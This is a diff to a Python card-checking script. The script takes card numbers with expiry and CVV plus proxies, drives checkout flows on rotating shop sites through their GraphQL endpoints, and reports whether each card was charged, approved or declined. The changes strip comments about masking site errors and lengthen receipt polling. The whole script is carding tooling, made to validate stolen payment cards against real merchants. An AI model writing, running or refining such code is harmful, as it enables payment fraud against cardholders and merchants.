@@ -345,7 +345,7 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
         return None, None, None
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🛒 PAYLOAD BUILDER (Handles Digital vs Physical)
+# 🛒 PAYLOAD BUILDER
 # ─────────────────────────────────────────────────────────────────────────────
 def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False):
     if addr:
@@ -521,7 +521,7 @@ def _classify_failed(code):
     return (c or "CARD_DECLINED"), False, False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🧠 PIPELINE (Internal Retry Loop to Mask Site Errors)
+# 🧠 PIPELINE
 # ─────────────────────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
     t_start = time.monotonic()
@@ -533,10 +533,9 @@ def _run_check(card_str, proxy_str):
     ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
     yyyy = "20" + yy if len(yy) == 2 else yy
 
-    # ═══ FIX: Internal Retry Loop (Silently retries new products on failure) ═══
     for attempt in range(3):
         if remain() < 15:
-            break # Not enough time left for a full attempt
+            break
 
         prod = _get_next_product()
         if not prod:
@@ -558,10 +557,10 @@ def _run_check(card_str, proxy_str):
                 r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
                                 allow_redirects=True, timeout=t_max(4))
             except Exception:
-                continue # Silently fail and try next product
+                continue 
             
             if r.status_code != 200:
-                continue # Silently fail and try next product
+                continue 
 
             checkout_url  = r.url
             checkout_html = r.text
@@ -571,7 +570,7 @@ def _run_check(card_str, proxy_str):
             commit_sha    = _commit_sha(checkout_html)
             stable_id     = _stable_id(checkout_html)
             if not session_token or not commit_sha or not stable_id:
-                continue # Missing tokens, try next product
+                continue 
 
             prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(4))
             prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
@@ -616,7 +615,7 @@ def _run_check(card_str, proxy_str):
                         r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
                         
             except Exception:
-                continue # Retry next product
+                continue
             
             if r1.status_code != 200:
                 continue
@@ -676,10 +675,10 @@ def _run_check(card_str, proxy_str):
                 pm_id = _payment_method_id_from_html(checkout_html)
 
             if not pm_id or (shipping_required and not del_h):
-                continue # Failed to get delivery/payment, try next product
+                continue 
 
             if remain() < 5:
-                break # Out of time
+                break 
 
             ident_sig = _ident_sig(checkout_html)
             v_url     = _vault_url(checkout_html)
@@ -699,7 +698,6 @@ def _run_check(card_str, proxy_str):
             merch_key = "lines" if use_lines else "merchandiseLines"
 
             def _build_submit(cur_tax, cur_total):
-                # ═══ FIX: Digital Products use NONE delivery ═══
                 if not shipping_required:
                     delivery_block = {
                         "deliveryLines": [{
@@ -835,7 +833,6 @@ def _run_check(card_str, proxy_str):
             cur_tax = tax or "0.0"
             cur_tot = amount_f
             
-            # ═══ FIX: Tax Retry Loop for PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT ═══
             for tax_attempt in range(2):
                 try:
                     r_submit = session.post(
@@ -845,7 +842,7 @@ def _run_check(card_str, proxy_str):
                     )
                     body = r_submit.text
                 except Exception:
-                    break # Try next product
+                    break
 
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body or "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
                     nt = _tax_from_rejected(body)
@@ -858,7 +855,6 @@ def _run_check(card_str, proxy_str):
 
             elapsed_ms = (time.monotonic() - t_start) * 1000
 
-            # ═══ REAL CARD RESULTS ═══
             if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
                 return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
             if '"ActionRequiredReceipt"' in body:
@@ -870,10 +866,11 @@ def _run_check(card_str, proxy_str):
             if '"ProcessingReceipt"' in body:
                 rid = _receipt_id(body)
                 rss = _receipt_session(body)
-                if rid and rss and remain() > 3:
-                    for _ in range(3):
+                if rid and rss and remain() > 4:
+                    # ═══ FIX: Increased polling to 10 attempts (5 seconds) ═══
+                    for _ in range(10):
                         if remain() < 2: break
-                        time.sleep(0.4)
+                        time.sleep(0.5)
                         try:
                             params = {"operationName":"PollForReceipt",
                                       "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
@@ -901,12 +898,11 @@ def _run_check(card_str, proxy_str):
                 return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
 
         except Exception:
-            continue # Silently retry next site on any top-level error
+            continue
         finally:
             try: session.close()
             except Exception: pass
 
-    # If we looped 3 times and all failed due to site/proxy issues, return a masked fail
     return _resp("DECLINED", price="0 USD")
 
 # ─────────────────────────────────────────────────────────────────────────────
